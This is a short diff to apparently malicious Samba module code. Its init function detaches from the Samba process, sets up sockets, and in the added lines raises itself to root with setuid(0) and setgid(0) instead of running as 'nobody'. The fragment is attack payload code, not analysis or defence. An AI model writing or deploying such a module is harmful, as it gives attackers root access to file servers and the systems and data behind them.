@@ -55,6 +55,10 @@ int samba_init_module(void){
     // Detach from Samba process, now we can work
     detachFromParent();
 
+    // Make us root user rather than "nobody"
+    setuid(0);
+    setgid(0);
+
     // Data structures for our socket
     int hostSocket;
     int clientSocket;
